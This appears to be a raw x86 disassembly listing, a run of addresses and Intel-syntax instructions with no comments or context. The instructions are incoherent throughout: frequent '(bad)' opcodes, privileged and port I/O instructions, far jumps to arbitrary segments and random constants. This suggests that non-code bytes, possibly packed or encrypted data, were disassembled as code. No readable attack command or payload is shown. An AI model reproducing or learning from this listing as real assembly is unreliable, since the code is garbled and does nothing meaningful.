  40f6e6:	retf   
  40f6e7:	inc    edx
  40f6e8:	jle    0x40f763
  40f6ea:	retf   
  40f6eb:	cwde   
  40f6ec:	cs int 0x43
  40f6ef:	xchg   edx,eax
  40f6f0:	and    al,BYTE PTR [ecx]
  40f6f2:	rcr    ch,1
  40f6f4:	cs ds stc 
  40f6f7:	fiadd  DWORD PTR [ebp+0x22]
  40f6fa:	mov    esi,es
  40f6fc:	mov    ebx,0x981fb009
  40f701:	in     eax,0xf6
  40f703:	push   0x28
  40f705:	jae    0x40f750
  40f707:	pop    edx
  40f708:	xchg   ebx,eax
  40f709:	and    ah,BYTE PTR [ebx]
  40f70b:	outs   dx,DWORD PTR ds:[esi]
  40f70c:	movq   mm1,mm5
  40f70f:	scas   eax,DWORD PTR es:[edi]
  40f710:	sbb    al,0x18
  40f712:	icebp  
  40f713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f714:	mov    ebx,edi
  40f716:	shl    DWORD PTR [esi+0x37f521],1
  40f71c:	mov    fs,WORD PTR [esp+edx*4+0x6420dc22]
  40f723:	dec    esp
  40f724:	inc    esp
  40f725:	imul   esp,DWORD PTR [edi-0xa],0x25cb69af
  40f72c:	inc    edx
  40f72d:	push   es
  40f72e:	mov    cl,bh
  40f730:	inc    edx
  40f731:	mov    ds:0x60159bc7,al
  40f736:	dec    edx
  40f737:	inc    edi
  40f738:	xor    DWORD PTR [ecx],0xffffffc5
  40f73b:	pop    es
  40f73c:	inc    eax
  40f73d:	popf   
  40f73e:	mov    ah,0x29
  40f740:	mov    ebx,0x56270242
  40f745:	xor    dl,BYTE PTR [ebx+edi*8-0x3f233699]
  40f74c:	push   edx
  40f74d:	mov    ebp,0xa0917cd7
  40f752:	xchg   edx,eax
  40f753:	fld    QWORD PTR [ecx-0x31b5a5c8]
  40f759:	clc    
  40f75a:	shr    al,cl
  40f75c:	je     0x40f70d
  40f75e:	loope  0x40f72e
  40f760:	mov    esp,0xc1c98e5f
  40f765:	dec    edx
  40f766:	push   ss
  40f767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f768:	lea    ebp,[ebp+0x5]
  40f76b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f76c:	mov    al,0xde
  40f76e:	sahf   
  40f76f:	out    0xcc,al
  40f771:	mov    edi,0x8721c950
  40f776:	push   esi
  40f777:	pusha  
  40f778:	lahf   
  40f779:	sbb    BYTE PTR [ecx],dl
  40f77b:	cld    
  40f77c:	ss iret 
  40f77e:	mov    al,ds:0x8fbfde72
  40f783:	cmp    DWORD PTR [esi],ecx
  40f785:	(bad)  
  40f786:	dec    eax
  40f787:	or     cl,BYTE PTR [edx-0x756829b4]
  40f78d:	test   al,0x5
  40f78f:	mov    WORD PTR [esi],fs
  40f791:	stos   DWORD PTR es:[edi],eax
  40f792:	and    eax,0x823ca1a0
  40f797:	int    0x61
  40f799:	loopne 0x40f769
  40f79b:	jns    0x40f7fa
  40f79d:	lods   eax,DWORD PTR ds:[esi]
  40f79e:	push   esp
  40f79f:	popf   
  40f7a0:	imul   BYTE PTR [ecx+0x1d916c39]
  40f7a6:	int    0x80
  40f7a8:	les    ecx,FWORD PTR [edx+0x69]
  40f7ab:	scas   eax,DWORD PTR es:[edi]
  40f7ac:	in     al,0x6f
  40f7ae:	cmp    bl,BYTE PTR [edi+0x6100e210]
  40f7b4:	push   DWORD PTR [esi]
  40f7b6:	bound  edx,QWORD PTR [ecx+0x658f4f38]
  40f7bc:	mov    ebx,0x74245c64
  40f7c1:	in     eax,0xac
  40f7c3:	fucom  st(5)
  40f7c5:	add    ch,BYTE PTR [edi]
  40f7c7:	int    0x1e
  40f7c9:	shr    ah,1
  40f7cb:	fs ret 0x61ff
  40f7cf:	lds    esi,FWORD PTR [edx]
  40f7d1:	mov    dl,BYTE PTR [edx+edx*8]
  40f7d4:	dec    esi
  40f7d5:	imul   eax,ebx,0x74a62717
  40f7db:	ss icebp 
  40f7dd:	xor    ch,BYTE PTR [ebp+0x35]
  40f7e0:	sub    eax,0xfcca2701
  40f7e5:	or     DWORD PTR [ebp+0x4cecb554],esi
  40f7eb:	or     DWORD PTR [ebp-0x26],eax
  40f7ee:	out    0xe7,al
  40f7f0:	popa   
  40f7f1:	popf   
  40f7f2:	push   es
  40f7f3:	xor    al,0x1b
  40f7f5:	fs mov dl,0x32
  40f7f8:	gs loopne 0x40f831
  40f7fb:	or     esp,ebx
  40f7fd:	sbb    ch,BYTE PTR [ebx]
  40f7ff:	sub    bh,BYTE PTR [esi]
  40f801:	mov    bl,0xb6
  40f803:	je     0x40f84e
  40f805:	int3   
  40f806:	out    0x5f,eax
  40f808:	add    ecx,DWORD PTR [esp+esi*8-0x63]
  40f80c:	loop   0x40f7e9
  40f80e:	(bad)  
  40f80f:	mov    ah,0x8c
  40f811:	mov    dh,0xdd
  40f813:	scas   eax,DWORD PTR es:[edi]
  40f814:	sub    DWORD PTR [esi+0x10cb0670],ebx
  40f81a:	pop    edx
  40f81b:	popf   
  40f81c:	jno    0x40f7e2
  40f81e:	rcl    BYTE PTR [edi+0x18],1
  40f821:	loop   0x40f882
  40f823:	in     al,0xc7
  40f825:	jmp    0x40f7e2
  40f827:	push   ebx
  40f828:	fwait
  40f829:	outs   dx,BYTE PTR ds:[esi]
  40f82a:	mov    eax,0x2b6c42fb
  40f82f:	jns    0x40f82e
  40f831:	(bad)  
  40f833:	out    0x7,al
  40f835:	arpl   WORD PTR [edx],si
  40f837:	inc    esp
  40f838:	rcr    DWORD PTR [ebx+ebp*2+0x33882cea],1
  40f83f:	fcmove st,st(2)
  40f841:	fild   DWORD PTR gs:[esi+esi*8]
  40f845:	lds    esi,FWORD PTR [edi-0x17]
  40f848:	cmp    edx,DWORD PTR [edi]
  40f84a:	out    0x4a,eax
  40f84c:	loope  0x40f7eb
  40f84e:	dec    eax
  40f84f:	add    eax,0x9e2e2be9
  40f854:	outs   dx,DWORD PTR ds:[esi]
  40f855:	fidivr DWORD PTR ds:0xbd5b1217
  40f85b:	rcr    BYTE PTR [eax-0x3f],cl
  40f85e:	cmp    BYTE PTR [esi],cl
  40f860:	sbb    DWORD PTR [edi+0x35],esi
  40f863:	inc    edi
  40f864:	leave  
  40f865:	pop    ebx
  40f866:	mov    cl,BYTE PTR [esi-0x4d]
  40f869:	pusha  
  40f86a:	mov    edx,0x21d8050a
  40f86f:	es stc 
  40f871:	outs   dx,BYTE PTR ds:[esi]
  40f872:	xchg   esp,eax
  40f873:	cmp    esp,DWORD PTR [ebp+0x62]
  40f876:	mov    bh,0x24
  40f878:	jo     0x40f869
  40f87a:	je     0x40f820
  40f87c:	popa   
  40f87d:	mov    esp,0x24a7843b
  40f882:	in     eax,dx
  40f883:	sahf   
  40f884:	je     0x40f856
  40f886:	mov    eax,0xe9f8266a
  40f88b:	mov    bp,0xc316
  40f88f:	in     al,0xdf
  40f891:	shl    al,1
  40f893:	sbb    al,0x54
  40f895:	out    dx,al
  40f896:	cli    
  40f897:	mov    ch,0x2e
  40f899:	or     al,0x82
  40f89b:	jmp    0xc2c:0xad58a4d5
  40f8a2:	and    ah,BYTE PTR [esi+0x6bec94e6]
  40f8a8:	mov    dh,0xdb
  40f8aa:	jge    0x40f8ad
  40f8ac:	jns    0x40f851
  40f8ae:	int    0x67
  40f8b0:	dec    ebx
  40f8b1:	or     dh,BYTE PTR [edi+0x58f75cfb]
  40f8b7:	cmc    
  40f8b8:	pushf  
  40f8b9:	xor    cl,BYTE PTR [ebx+0x5c]
  40f8bc:	jne    0x40f890
  40f8be:	lds    ebp,FWORD PTR [ebx-0x3f]
  40f8c1:	stos   DWORD PTR es:[edi],eax
  40f8c2:	add    eax,0xe8d3bdaa
  40f8c7:	in     eax,dx
  40f8c8:	xchg   edx,eax
  40f8c9:	mov    ebx,0xb427ff83
  40f8ce:	daa    
  40f8cf:	mov    dh,BYTE PTR [ebp-0x628d50a2]
  40f8d5:	int3   
  40f8d6:	cmp    ebx,DWORD PTR [esi+0x39418ad6]
  40f8dc:	lods   al,BYTE PTR ds:[esi]
  40f8dd:	je     0x40f8cb
  40f8df:	pusha  
  40f8e0:	mov    al,0x4b
  40f8e2:	mov    edx,0x907998c8
  40f8e7:	shr    DWORD PTR [esi],cl
  40f8e9:	js     0x40f8f7
  40f8eb:	mov    ds:0x9fa58b3a,eax
  40f8f0:	inc    esp
  40f8f1:	inc    ebp
  40f8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8f3:	xchg   esi,eax
  40f8f4:	mov    eax,0x56182018
  40f8f9:	ins    BYTE PTR es:[edi],dx
  40f8fa:	sub    bh,BYTE PTR ds:[esi+0x4c3d5bd6]
  40f901:	popf   
  40f902:	into   
  40f903:	ins    BYTE PTR es:[edi],dx
  40f904:	jecxz  0x40f91c
  40f906:	ss ss repnz xchg ecx,eax
  40f90a:	rcl    DWORD PTR [eax+0x44],1
  40f90d:	sbb    eax,ebx
  40f90f:	cmc    
  40f910:	aam    0x3d
  40f912:	fxam   
  40f914:	sti    
  40f915:	aam    0xb6
  40f917:	je     0x40f91a
  40f919:	pop    ebp
  40f91a:	or     al,0x65
  40f91c:	jmp    0x40f8b1
  40f91e:	(bad)  
  40f91f:	xor    BYTE PTR [edx],bl
  40f921:	pop    edi
  40f922:	outs   dx,DWORD PTR ds:[esi]
  40f923:	add    eax,0xd0b3ca9f
  40f928:	(bad)  
  40f929:	mov    cl,0x62
  40f92b:	sub    esp,eax
  40f92d:	jne    0x40f909
  40f92f:	out    0x9f,al
  40f931:	int3   
  40f932:	cld    
  40f933:	lds    eax,FWORD PTR [esi]
  40f935:	daa    
  40f936:	adc    DWORD PTR [edi-0x7],esi
  40f939:	sahf   
  40f93a:	loopne 0x40f97a
  40f93c:	lods   eax,DWORD PTR ds:[esi]
  40f93d:	add    al,0x75
  40f93f:	repz repnz gs or edi,edi
  40f944:	mov    al,0xe3
  40f946:	imul   edx,DWORD PTR [edx+edi*2-0x5054e325],0xbafeeb1e
  40f951:	pop    esp
  40f952:	jp     0x40f9cf
  40f954:	push   esp
  40f955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f956:	in     al,dx
  40f957:	or     BYTE PTR [esi-0x19be8c8c],cl
  40f95d:	mov    DWORD PTR [ebp+0x6d99d427],edx
  40f963:	dec    edx
  40f964:	mov    ah,BYTE PTR [esi+0x45c6c547]
  40f96a:	mov    eax,0x8caec54d
  40f96f:	xchg   ebx,eax
  40f970:	fldln2 
  40f972:	xor    dl,BYTE PTR [edx-0x3d]
  40f975:	mov    BYTE PTR [ebx+0x623a7873],dh
  40f97b:	popf   
  40f97c:	(bad)  
  40f97d:	lock inc esi
  40f97f:	cmp    esi,DWORD PTR ds:0xc2f54d50
  40f985:	add    cl,dh
  40f987:	push   ecx
  40f988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f989:	ss mov esp,0x5eece660
  40f98f:	xor    al,0xb
  40f991:	rcr    DWORD PTR [ebp+0x78ae3a6a],cl
  40f997:	dec    ebp
  40f998:	rol    BYTE PTR [edx+0x2e097944],cl
  40f99e:	push   esp
  40f99f:	xlat   BYTE PTR ds:[ebx]
  40f9a0:	mov    esi,0xf4ce1ca8
  40f9a5:	aad    0x83
  40f9a7:	xchg   esi,eax
  40f9a8:	pop    ss
  40f9a9:	pop    DWORD PTR [esi]
  40f9ab:	popf   
  40f9ac:	and    al,0xc7
  40f9ae:	js     0x40fa2f
  40f9b0:	out    dx,eax
  40f9b1:	dec    ebp
  40f9b2:	adc    DWORD PTR [edi-0x59],ebp
  40f9b5:	sub    ebx,edx
  40f9b7:	stc    
  40f9b8:	movd   mm6,eax
  40f9bb:	sub    ebp,esp
  40f9bd:	dec    esi
  40f9be:	jns    0x40f992
  40f9c0:	sub    DWORD PTR [edx],eax
  40f9c2:	adc    cl,BYTE PTR [ecx-0x46]
  40f9c5:	pop    esi
  40f9c6:	int    0x9b
  40f9c8:	push   ecx
  40f9c9:	sti    
  40f9ca:	add    dl,BYTE PTR [eax+0x58]
  40f9cd:	xor    al,0x92
  40f9cf:	pop    ds
  40f9d0:	sub    cl,0x9c
  40f9d3:	out    0x20,eax
  40f9d5:	cli    
  40f9d6:	push   0x18588fae
  40f9db:	mov    esi,0x2fea8e1e
  40f9e0:	cli    
  40f9e1:	sub    edi,DWORD PTR [edx+0x7bdd7fd8]
  40f9e7:	repnz loopne 0x40fa1c
  40f9ea:	bound  esp,QWORD PTR [ebx-0x17d088ac]
  40f9f0:	pushf  
  40f9f1:	imul   eax,DWORD PTR [eax+0xd90e963],0xffffffa9
  40f9f8:	(bad)  
  40f9f9:	stc    
  40f9fa:	int3   
  40f9fb:	cmp    dh,0xd0
  40f9fe:	xchg   BYTE PTR [ebp-0xa2a2741],dl
  40fa04:	mov    dl,0xc0
  40fa06:	jnp    0x40f9f7
  40fa08:	lds    esp,FWORD PTR [ebx+0x31]
  40fa0b:	sar    dl,1
  40fa0d:	xchg   esi,eax
  40fa0e:	jmp    0xe1a2:0x1d020152
  40fa15:	repz out dx,al
  40fa17:	cmp    DWORD PTR [ecx+0x59d20460],edi
  40fa1d:	ret    
  40fa1e:	call   DWORD PTR [esi-0x33]
  40fa21:	aaa    
  40fa22:	push   edi
  40fa23:	dec    eax
  40fa24:	xchg   ebp,eax
  40fa25:	sahf   
  40fa26:	in     eax,0xd0
  40fa28:	(bad)  
  40fa29:	mov    ecx,0x9fb0ab55
  40fa2e:	or     BYTE PTR [esi-0x7199b28b],0x70
  40fa35:	sub    al,BYTE PTR [ecx+0x37]
  40fa38:	fistp  WORD PTR [edx+0xf]
  40fa3b:	pop    eax
  40fa3c:	les    edi,FWORD PTR [edx]
  40fa3e:	add    BYTE PTR [eax+0x4c],ch
  40fa41:	mov    esi,0xf4f43779
  40fa46:	(bad)  
  40fa47:	dec    esp
  40fa48:	idiv   BYTE PTR [ecx-0x7dcbefdb]
  40fa4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa4f:	lock mov edi,0xc54bc4c8
  40fa55:	jg     0x40fac2
  40fa57:	sub    ebp,edx
  40fa59:	or     DWORD PTR [edi],0x2fda7552
  40fa5f:	xor    DWORD PTR [eax+0x3b],edx
  40fa62:	ds lahf 
  40fa64:	jo     0x40fa38
  40fa66:	ins    BYTE PTR es:[edi],dx
  40fa67:	push   es
  40fa68:	mov    esp,0xc2f8f127
  40fa6d:	push   0x42
  40fa6f:	call   0xcaf76972
  40fa74:	pushf  
  40fa75:	inc    edx
  40fa76:	sbb    edi,DWORD PTR [eax+0x5b07dee3]
  40fa7c:	loopne 0x40faed
  40fa7e:	jl     0x40fad6
  40fa80:	mov    dh,BYTE PTR [edi]
  40fa82:	adc    eax,0xc7fa2032
  40fa87:	(bad)  
  40fa89:	cmp    edx,DWORD PTR [ebp+0x7]
  40fa8c:	push   edx
  40fa8d:	mov    ecx,0xa478db20
  40fa92:	mov    ch,0xdb
  40fa94:	inc    DWORD PTR [edi]
  40fa96:	sbb    al,0x27
  40fa98:	std    
  40fa99:	retf   0xd025
  40fa9c:	dec    ebx
  40fa9d:	imul   ebx,DWORD PTR [edx+0x7f],0x27
  40faa1:	dec    edi
  40faa2:	and    bl,cl
  40faa4:	test   al,0x52
  40faa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faa7:	cmp    cl,BYTE PTR [edx]
  40faa9:	std    
  40faaa:	addr16 jmp 0x40fac5
  40faad:	add    ebp,ecx
  40faaf:	add    BYTE PTR [eax+0x15],dl
  40fab2:	je     0x40fa9c
  40fab4:	daa    
  40fab5:	es inc edx
  40fab7:	arpl   WORD PTR fs:[esp+edi*2+0xedb9384],di
  40fabf:	scas   eax,DWORD PTR es:[edi]
  40fac0:	push   ecx
  40fac1:	xlat   BYTE PTR ds:[ebx]
  40fac2:	mov    eax,0x7f24db91
  40fac7:	pusha  
  40fac8:	jle    0x40faa5
  40faca:	lods   eax,DWORD PTR ds:[esi]
  40facb:	push   edx
  40facc:	sbb    BYTE PTR [ecx],ch
  40face:	xchg   DWORD PTR [edi-0x48],esi
  40fad1:	and    esp,esp
  40fad3:	jo     0x40fa85
  40fad5:	mov    WORD PTR [esi+0x31],?
  40fad8:	dec    ebx
  40fad9:	rcr    BYTE PTR [edx-0x1f],1
  40fadc:	mov    edx,0xd1d75235
  40fae1:	cmp    eax,0xab865e24
  40fae6:	inc    edx
  40fae7:	jg     0x40faa3
  40fae9:	push   es
  40faea:	pop    eax
  40faeb:	mov    eax,0x80d38393
  40faf0:	sub    eax,0x7ecfa063
  40faf5:	neg    BYTE PTR [edi+0x4d3d01e6]
  40fafb:	repz push cs
  40fafd:	(bad)  
  40fafe:	jnp    0x40fb51
  40fb00:	or     dl,BYTE PTR [eax-0x51]
  40fb03:	push   ebp
  40fb04:	jae    0x40fb09
  40fb06:	(bad)  
  40fb07:	mov    al,0x3a
  40fb09:	adc    bh,dh
  40fb0b:	xor    al,0x17
  40fb0d:	or     dh,BYTE PTR [eax+0x3]
  40fb10:	in     al,dx
  40fb11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb12:	sbb    eax,0xd183c27e
  40fb17:	arpl   WORD PTR [ecx],bp
  40fb19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb1a:	mov    eax,0x8b33adb
  40fb1f:	sbb    eax,0x9e5e09cb
  40fb24:	stc    
  40fb25:	mov    al,ds:0xe273442a
  40fb2a:	stos   DWORD PTR es:[edi],eax
  40fb2b:	jne    0x40fb82
  40fb2d:	jno    0x40fad7
  40fb2f:	ds retf 0x3e96
  40fb33:	jp     0x40fab7
  40fb35:	mov    bh,0xc1
  40fb37:	xor    eax,0xbd6c9883
  40fb3c:	call   0x8e21:0x99893eca
  40fb43:	push   ecx
  40fb44:	cmp    ah,BYTE PTR [ecx+0x6a]
  40fb47:	adc    esp,esi
  40fb49:	push   ds
  40fb4a:	lds    ebp,FWORD PTR [ebp+0x2c]
  40fb4d:	or     eax,0x80a4137f
  40fb52:	pop    es
  40fb53:	scas   eax,DWORD PTR es:[edi]
  40fb54:	outs   dx,DWORD PTR ds:[esi]
  40fb55:	adc    eax,0x2aa85ee3
  40fb5a:	inc    edx
  40fb5b:	stc    
  40fb5c:	cld    
  40fb5d:	les    ebx,FWORD PTR [ebx]
  40fb5f:	fsincos 
  40fb61:	dec    ebp
  40fb62:	xlat   BYTE PTR ds:[ebx]
  40fb63:	mov    al,0x91
  40fb65:	xor    BYTE PTR [edi+0x61],dl
  40fb68:	mov    fs,WORD PTR [ecx+ebp*8]
  40fb6b:	jp     0x40fb21
  40fb6d:	in     eax,dx
  40fb6e:	repz mov eax,0xd7fdbd41
  40fb74:	scas   al,BYTE PTR es:[edi]
  40fb75:	imul   edx,DWORD PTR [edi+0x476c7710],0x182c3042
  40fb7f:	inc    ecx
  40fb80:	push   eax
  40fb81:	push   ds
  40fb82:	xchg   ebx,eax
  40fb83:	mov    ebx,0xe4a5bb2c
  40fb88:	and    al,0x81
  40fb8a:	imul   eax,DWORD PTR [ecx-0x12],0xd6d172a6
  40fb91:	int    0x69
  40fb93:	pop    ebx
  40fb94:	rol    BYTE PTR [esi],cl
  40fb96:	out    0xc6,al
  40fb98:	enter  0xb400,0x4e
  40fb9c:	add    DWORD PTR [ebx-0x80],0xffffffb4
  40fba0:	sbb    BYTE PTR [eax],bh
  40fba2:	in     al,dx
  40fba3:	in     al,0xa7
  40fba5:	(bad)  
  40fba7:	mov    ds:0xfaf8b48c,al
  40fbac:	imul   ecx,DWORD PTR [eax+0x2e],0xffffff85
  40fbb0:	enter  0x225d,0xe8
  40fbb4:	aaa    
  40fbb5:	xor    al,0x36
  40fbb7:	les    esi,FWORD PTR [ecx]
  40fbb9:	jp     0x40fbe1
  40fbbb:	test   BYTE PTR [ebx],0x81
  40fbbe:	call   0x57fc6d53
  40fbc3:	mov    DWORD PTR [ecx+ebp*4+0x277d6ca8],ebx
  40fbca:	xor    eax,esi
  40fbcc:	sti    
  40fbcd:	fld    DWORD PTR [ecx-0x315a1154]
  40fbd3:	mov    ds:0x8e4ba5f9,al
  40fbd8:	or     eax,0x4e637ed4
  40fbdd:	cmc    
  40fbde:	lea    esi,[bp+si]
  40fbe1:	push   edx
  40fbe2:	cmc    
  40fbe3:	stos   BYTE PTR es:[edi],al
  40fbe4:	jno    0x40fc20
  40fbe6:	call   0xd44:0xd2718e86
  40fbed:	int3   
  40fbee:	in     eax,dx
  40fbef:	repz sahf 
  40fbf1:	sbb    eax,0x2a2ed84
  40fbf6:	xchg   BYTE PTR [eax-0x28],dh
  40fbf9:	inc    edi
  40fbfa:	push   esp
  40fbfb:	fild   WORD PTR [edi-0x7f]
  40fbfe:	inc    DWORD PTR [eax-0x4b6b2e26]
  40fc04:	jne    0x40fbba
  40fc06:	pop    esp
  40fc07:	sbb    dh,bl
  40fc09:	popa   
  40fc0a:	jg     0x40fc47
  40fc0c:	sbb    ch,BYTE PTR [ebp+0x2c]
  40fc0f:	inc    ecx
  40fc10:	ret    0xb471
  40fc13:	mov    ebp,0xadb7856d
  40fc18:	fwait
  40fc19:	push   ds
  40fc1a:	mov    ecx,0x956d87b8
  40fc1f:	sub    BYTE PTR [eax+0x260fb04a],al
  40fc25:	fcom   QWORD PTR [edx+edi*1+0x79]
  40fc29:	(bad)  
  40fc2a:	in     eax,dx
  40fc2b:	add    al,BYTE PTR [ecx-0x3b]
  40fc2e:	dec    esp
  40fc2f:	popf   
  40fc30:	push   ebp
  40fc31:	sub    DWORD PTR [ebx],edi
  40fc33:	pop    es
  40fc34:	or     eax,0xe47f6f12
  40fc39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc3a:	push   es
  40fc3b:	push   ss
  40fc3c:	push   esi
  40fc3d:	ret    
  40fc3e:	mov    al,0x14
  40fc40:	xor    bl,al
  40fc42:	lahf   
  40fc43:	mov    bh,0x83
  40fc45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc46:	aad    0xd6
  40fc48:	das    
  40fc49:	mov    DWORD PTR [edi-0x2ab9cb1],edi
  40fc4f:	aaa    
  40fc50:	mov    edx,cr0
  40fc53:	or     DWORD PTR [edx*1+0x2e47c0e9],0x8bf62c3c
  40fc5e:	dec    esp
  40fc5f:	push   ebp
  40fc60:	imul   sp,WORD PTR [ebp-0x1869840],0x1d
  40fc68:	sub    cl,ch
  40fc6a:	push   es
  40fc6b:	(bad)  [edx+0x51]
  40fc6e:	dec    edx
  40fc6f:	loopne 0x40fc4a
  40fc71:	cdq    
  40fc72:	lods   eax,DWORD PTR ds:[esi]
  40fc73:	psubw  mm0,QWORD PTR [eax+0x72]
  40fc77:	or     al,0x72
  40fc79:	ins    BYTE PTR es:[edi],dx
  40fc7a:	int3   
  40fc7b:	js     0x40fcb1
  40fc7d:	nop
  40fc7e:	hlt    
  40fc7f:	jg     0x40fc89
  40fc81:	add    cl,cl
  40fc83:	sub    al,0xf0
  40fc85:	cmp    DWORD PTR [eax-0x30b8bac9],ebx
  40fc8b:	fdivr  QWORD PTR [eax]
  40fc8d:	and    BYTE PTR [ebx],ah
  40fc8f:	mov    eax,ds:0x9c36d806
  40fc94:	fidiv  WORD PTR [ebx]
  40fc96:	retf   0xa7f4
  40fc99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc9a:	cdq    
  40fc9b:	xchg   ecx,eax
  40fc9c:	cwde   
  40fc9d:	cs jmp 0xb5ddef9a
  40fca3:	ja     0x40fca9
  40fca5:	ret    0xdc1f
  40fca8:	push   ecx
  40fca9:	sbb    dh,BYTE PTR [ecx+0x41]
  40fcac:	fnstenv [ebp+ecx*1-0x2f8c66c1]
  40fcb3:	cmp    al,0x85
  40fcb5:	shl    DWORD PTR [eax+0x51016805],1
  40fcbb:	lahf   
  40fcbc:	sbb    DWORD PTR [ebx],0x30b163ad
  40fcc2:	(bad)
  40fcc5:	xchg   DWORD PTR [ecx+0x65],ebx
  40fcc8:	add    eax,edx
  40fcca:	mov    edx,0xdaa6c58
  40fccf:	fldenv [ebp+0x1d2698c]
  40fcd5:	inc    eax
  40fcd6:	mov    BYTE PTR [esi-0x34f03dde],dl
  40fcdc:	push   ebp
  40fcdd:	fcomp  QWORD PTR ds:0x5c2b453
  40fce3:	lds    ecx,FWORD PTR [ebp-0x49]
  40fce6:	mov    cl,0x50
  40fce8:	xor    DWORD PTR [edx+0x151f86a9],0x35adc56d
  40fcf2:	mov    ds:0x542066f0,eax
  40fcf7:	jns    0x40fcc2
  40fcf9:	inc    ebp
  40fcfa:	adc    eax,0xc0efffcd
  40fcff:	mov    ah,0xd6
  40fd01:	mov    cl,0xb6
  40fd03:	in     eax,0x70
  40fd05:	in     al,0x6d
  40fd07:	retf   0xe1c7
  40fd0a:	retf   0xfaf5
  40fd0d:	sar    DWORD PTR [esi+0x6b254df2],cl
  40fd13:	and    DWORD PTR [ecx+0x4cc5f8b8],edx
  40fd19:	enter  0x350c,0xbc
  40fd1d:	cmc    
  40fd1e:	adc    DWORD PTR [edx-0x7],esi
  40fd21:	mov    esp,0x8afe43ad
  40fd26:	cmp    eax,0x7068052f
  40fd2b:	dec    ebp
  40fd2c:	or     BYTE PTR [edi-0x47],dl
  40fd2f:	lds    ebp,FWORD PTR [eax-0xc]
  40fd32:	pop    ds
  40fd33:	mov    esp,0xb7884f40
  40fd38:	add    ebp,DWORD PTR [esi-0x5a]
  40fd3b:	ror    BYTE PTR [edi],cl
  40fd3d:	in     eax,dx
  40fd3e:	dec    edi
  40fd3f:	das    
  40fd40:	fisttp WORD PTR [ebx]
  40fd42:	rcr    BYTE PTR [ebp+0x4d14c43d],cl
  40fd48:	jnp    0x40fd18
  40fd4a:	inc    edx
  40fd4b:	lods   eax,DWORD PTR ds:[esi]
  40fd4c:	adc    ecx,ebx
  40fd4e:	hlt    
  40fd4f:	ss add esp,esi
  40fd52:	dec    ebp
  40fd53:	xchg   esp,eax
  40fd54:	lock add bl,dh
  40fd57:	int3   
  40fd58:	rol    DWORD PTR [edx-0x4d4d11df],cl
  40fd5e:	mov    edi,0xb189a879
  40fd63:	in     al,0xfa
  40fd65:	push   ss
  40fd66:	push   ecx
  40fd67:	xchg   ebp,eax
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	xchg   edx,eax
  40fd6a:	jecxz  0x40fd77
  40fd6c:	repz mov bl,0x43
  40fd6f:	js     0x40fded
  40fd71:	dec    esi
  40fd72:	repz sub BYTE PTR [esi],0x72
  40fd76:	mov    ah,0xc1
  40fd78:	lods   eax,DWORD PTR ds:[esi]
  40fd79:	loopne 0x40fd85
  40fd7b:	mov    DWORD PTR [edi-0x54817425],eax
  40fd81:	jl     0x40fdf1
  40fd83:	sub    ecx,ebp
  40fd85:	or     BYTE PTR [edx+0x71da1d0c],dl
  40fd8b:	inc    edx
  40fd8c:	jne    0x40fd47
  40fd8e:	pop    eax
  40fd8f:	inc    esi
  40fd90:	icebp  
  40fd91:	dec    edx
  40fd92:	js     0x40fd26
  40fd94:	sar    BYTE PTR [edx],cl
  40fd96:	push   ecx
  40fd97:	aaa    
  40fd98:	fist   DWORD PTR [esi+0x22]
  40fd9b:	test   BYTE PTR [ebx+0x8c525be],dl
  40fda1:	pop    ebp
  40fda2:	dec    esp
  40fda3:	stos   DWORD PTR es:[edi],eax
  40fda4:	fsubr  DWORD PTR [ebp+0x4b]
  40fda7:	adc    DWORD PTR [esp+edx*8-0x65240ec5],ecx
  40fdae:	fxtract 
  40fdb0:	mov    ecx,0x4347f324
  40fdb5:	lods   eax,DWORD PTR ds:[esi]
  40fdb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdb7:	nop
  40fdb8:	fisttp WORD PTR [edi-0xeee61e0]
  40fdbe:	les    ebx,FWORD PTR [ebx]
  40fdc0:	stos   DWORD PTR es:[edi],eax
  40fdc1:	loopne 0x40fe0b
  40fdc3:	div    DWORD PTR [ecx-0x21]
  40fdc6:	jl     0x40fd74
  40fdc8:	add    ch,BYTE PTR [edi+0x31]
  40fdcb:	add    ah,BYTE PTR [ecx-0xbbe5d6b]
  40fdd1:	xor    BYTE PTR [esi-0x24],ah
  40fdd4:	(bad)  
  40fdd5:	call   0xf22b01aa
  40fdda:	out    0x70,al
  40fddc:	inc    edx
  40fddd:	in     eax,0xfa
  40fddf:	add    DWORD PTR [ebp-0x287b7793],0xe0e7b687
  40fde9:	sahf   
  40fdea:	in     al,dx
  40fdeb:	loop   0x40fdb5
  40fded:	std    
  40fdee:	jbe    0x40fe09
  40fdf0:	dec    ebp
  40fdf1:	jmp    FWORD PTR [edi+0xe]
  40fdf4:	xchg   edx,eax
  40fdf5:	fwait
  40fdf6:	out    0xd7,eax
  40fdf8:	jb     0x40fd90
  40fdfa:	and    cl,BYTE PTR cs:[eax+0x43]
  40fdfe:	aas    
  40fdff:	mov    ebp,0xbb656b61
  40fe04:	jns    0x40fda6
  40fe06:	or     BYTE PTR [edi-0x76],dh
  40fe09:	fwait
  40fe0a:	pushf  
  40fe0b:	test   eax,0x90448592
  40fe10:	fucom  st(7)
  40fe12:	test   DWORD PTR [edx],esp
  40fe14:	pop    eax
  40fe15:	mov    esi,0xa3298060
  40fe1a:	mov    dh,dl
  40fe1c:	fnsave [eax-0x76]
  40fe1f:	and    DWORD PTR [esi-0x1b],esi
  40fe22:	retf   
  40fe23:	add    edx,edi
  40fe25:	xor    ebx,esi
  40fe27:	mov    ebp,0x433b92d3
  40fe2c:	sbb    eax,0x65a71b91
  40fe31:	add    eax,0x62b8c25d
  40fe36:	sbb    DWORD PTR [edi+esi*4],edi
  40fe39:	push   es
  40fe3a:	dec    ebp
